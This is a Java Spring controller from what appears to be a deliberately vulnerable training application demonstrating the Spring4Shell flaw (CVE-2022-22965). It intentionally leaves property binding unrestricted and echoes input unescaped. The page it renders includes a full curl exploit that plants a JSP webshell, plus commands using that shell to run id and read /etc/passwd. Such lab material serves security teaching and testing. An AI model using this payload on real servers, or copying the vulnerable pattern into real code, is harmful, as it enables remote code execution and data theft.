// SPDX-FileCopyrightText: GoCortexIO
// SPDX-License-Identifier: AGPL-3.0-or-later

package com.gocortex.exploits;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import java.util.ResourceBundle;

@Controller
@RequestMapping("/spring4shell")
public class Spring4ShellController {
    private static final ResourceBundle locale = ResourceBundle.getBundle("servlet-locale");
    
    @GetMapping
    @ResponseBody
    public String vulnerableEndpoint(VulnerableBean bean) {
        // VULNERABLE: CVE-2022-22965 Spring4Shell
        // Exploitable when running on JDK 9+, Tomcat, and deployed as WAR
        // Attackers can access class.module.classLoader to manipulate AccessLogValve
        // This allows writing JSP webshells to the Tomcat root directory
        // Using unrestricted POJO to allow full property binding traversal
        
        StringBuilder html = new StringBuilder();
        html.append("<html><body>");
        html.append("<h1>").append(locale.getString("spring4shell.page_title")).append("</h1>");
        html.append("<p style='color:#666;'><strong>").append(locale.getString("common.version_label")).append("</strong> | ").append(locale.getString("common.vulnerability_tag")).append("</p>");
        html.append("<p><strong>").append(locale.getString("spring4shell.status_label")).append("</strong> ").append(locale.getString("spring4shell.status_value")).append("</p>");
        html.append("<p><strong>").append(locale.getString("spring4shell.spring_version_label")).append("</strong> ").append(locale.getString("spring4shell.spring_version_value")).append("</p>");
        html.append("<p><strong>").append(locale.getString("spring4shell.jdk_version_label")).append("</strong> ").append(System.getProperty("java.version")).append("</p>");
        html.append("<p><strong>").append(locale.getString("spring4shell.cve_label")).append("</strong> ").append(locale.getString("spring4shell.cve_value")).append("</p>");
        html.append("<p><strong>").append(locale.getString("spring4shell.cvss_label")).append("</strong> ").append(locale.getString("spring4shell.cvss_value")).append("</p>");
        html.append("<h2>").append(locale.getString("spring4shell.details_header")).append("</h2>");
        html.append("<p>").append(locale.getString("spring4shell.details_intro"));
        html.append("<ul>");
        html.append("<li><code>").append(locale.getString("spring4shell.details_classloader")).append("</code></li>");
        html.append("<li>").append(locale.getString("spring4shell.details_valve")).append("</li>");
        html.append("<li>").append(locale.getString("spring4shell.details_execution")).append("</li>");
        html.append("</ul></p>");
        html.append("<form method='get'>");
        html.append("<p>").append(locale.getString("spring4shell.form_name_label")).append(" <input type='text' name='name' placeholder='").append(locale.getString("spring4shell.form_name_placeholder")).append("' /></p>");
        html.append("<input type='submit' value='").append(locale.getString("spring4shell.submit_button")).append("' />");
        html.append("</form>");
        
        if (bean.getName() != null && !bean.getName().isEmpty()) {
            html.append("<p>").append(locale.getString("spring4shell.greeting_prefix")).append(" ").append(bean.getName()).append("!</p>");
        }
        
        html.append("<h3>").append(locale.getString("spring4shell.exploitation_header")).append("</h3>");
        html.append("<p><strong>").append(locale.getString("spring4shell.step1_title")).append("</strong></p>");
        html.append("<pre style='background:#f4f4f4;padding:10px;overflow-x:auto;font-size:12px;'>");
        html.append("curl 'http://YOUR_IP:9999/exploit-app/spring4shell?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=&name=test' \\\n");
        html.append("  -H 'suffix: %>//' \\\n");
        html.append("  -H 'c1: Runtime' \\\n");
        html.append("  -H 'c2: <%'\n");
        html.append("</pre>");
        html.append("<p><strong>").append(locale.getString("spring4shell.step2_title")).append("</strong></p>");
        html.append("<pre style='background:#f4f4f4;padding:10px;overflow-x:auto;font-size:12px;'>");
        html.append("curl 'http://YOUR_IP:9999/shell.jsp?pwd=j&cmd=whoami'\n");
        html.append("curl 'http://YOUR_IP:9999/shell.jsp?pwd=j&cmd=id'\n");
        html.append("curl 'http://YOUR_IP:9999/shell.jsp?pwd=j&cmd=cat%20/etc/passwd'\n");
        html.append("</pre>");
        html.append("<p style='color:#d32f2f;'><strong>").append(locale.getString("spring4shell.note_label")).append("</strong> ").append(locale.getString("spring4shell.note_text")).append("</p>");
        html.append("</body></html>");
        
        return html.toString();
    }
}

class VulnerableBean {
    private String name;
    
    public String getName() {
        return name;
    }
    
    public void setName(String name) {
        this.name = name;
    }
}
